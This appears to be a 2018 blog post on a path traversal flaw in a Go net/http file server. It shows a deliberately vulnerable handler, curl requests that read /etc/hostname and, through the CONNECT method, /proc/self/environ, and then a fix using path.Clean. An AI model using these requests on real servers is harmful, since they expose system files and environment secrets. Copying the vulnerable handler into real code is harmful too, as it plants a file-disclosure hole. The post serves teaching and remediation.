---
layout: post
title: ServeMux and path traversal exploitation
categories: exploitation, websecurity, go
tags: [go, websecurity, pathtraversal, exploitation]
comments: true
---

I really love Go language and write almost everything I do in it and it's a topic for other blog posts itself. Here we'll talk about pretty common path traversal vulnerability exploitation.

**TL;DR** Too many people think that `ServeMux` always sanitizes a URL request path when it's not. Well at least not *always*.

# Issue

Consider the following snippet:
```go
package main

import (
	"io/ioutil"
	"log"
	"net/http"
	"path/filepath"
	"strings"
)

const root = "/tmp"

func main() {
	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		filename := filepath.Join(root, strings.Trim(r.URL.Path, "/"))
		contents, err := ioutil.ReadFile(filename)
		if err != nil {
			w.WriteHeader(http.StatusNotFound)
			return
		}
		w.Write(contents)
	})

	server := &http.Server{
		Addr:    "127.0.0.1:50000",
		Handler: mux,
	}

	log.Fatal(server.ListenAndServe())
}
```


Seems like a basic path traversal for someone who do not write Go and write Go a lot :)

Let's create a file in `/tmp` folder to ensure everything works as expected:
```sh
echo content > /tmp/somefile
curl -v 127.0.0.1:50000/somefile
*   Trying 127.0.0.1...
* Connected to 127.0.0.1 (127.0.0.1) port 50000 (#0)
> GET /somefile HTTP/1.1
> Host: 127.0.0.1:50000
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Wed, 18 Jul 2018 18:08:46 GMT
< Content-Length: 8
< Content-Type: text/plain; charset=utf-8
< 
content
* Connection #0 to host 127.0.0.1 left intact
```


Seems okay, time to exploit it:
```sh
curl -v --path-as-is 127.0.0.1:50000/somefile/../../etc/hostname
*   Trying 127.0.0.1...
* Connected to 127.0.0.1 (127.0.0.1) port 50000 (#0)
> GET /something/../../../etc/hostname HTTP/1.1
> Host: 127.0.0.1:50000
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 301 Moved Permanently
< Content-Type: text/html; charset=utf-8
< Location: /etc/hostname
< Date: Wed, 18 Jul 2018 18:07:35 GMT
< Content-Length: 48
< 
<a href="/etc/hostname">Moved Permanently</a>.

* Connection #0 to host 127.0.0.1 left intact
```


Turns out that `ServeMux` canonicalize requested path so it's not *super easy* exploitable, but it still is.

Here goes the `CONNECT` method:
```sh
curl -v -X CONNECT --path-as-is 127.0.0.1:50000/../../proc/self/environ
*   Trying 127.0.0.1...
* Connected to 127.0.0.1 (127.0.0.1) port 50000 (#0)
> CONNECT /../../proc/self/environ HTTP/1.1
> Host: 127.0.0.1:50000
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Wed, 18 Jul 2018 18:17:55 GMT
< Content-Type: application/octet-stream
< Transfer-Encoding: chunked
< 
...
```

Bingo.


I should note that this is an expected behaviour and [clearly documented](https://golang.org/pkg/net/http/#ServeMux.Handler) in `net/http` package docs:
> The path and host are used unchanged for CONNECT requests.

# Remediation

Use `filepath.FromSlash` accompanied with `path.Clean`:
```diff
diff --git a/main.go b/main.go
index d50e6f3..91e5015 100644
--- a/main.go
+++ b/main.go
@@ -4,6 +4,7 @@ import (
        "io/ioutil"
        "log"
        "net/http"
+       "path"
        "path/filepath"
        "strings"
 )
@@ -13,7 +14,7 @@ const root = "/tmp"
 func main() {
        mux := http.NewServeMux()
        mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
-               filename := filepath.Join(root, strings.Trim(r.URL.Path, "/"))
+               filename := filepath.Join(root, filepath.FromSlash(path.Clean("/"+strings.Trim(r.URL.Path, "/"))))
                contents, err := ioutil.ReadFile(filename)
                if err != nil {
                        w.WriteHeader(http.StatusNotFound)
```


Also, it's a good practice to limit acceptable request methods.

If you're not able to fix the code - put a vulnerable service behind a reverse proxy like nginx, that do not allow `CONNECT` method request by default.
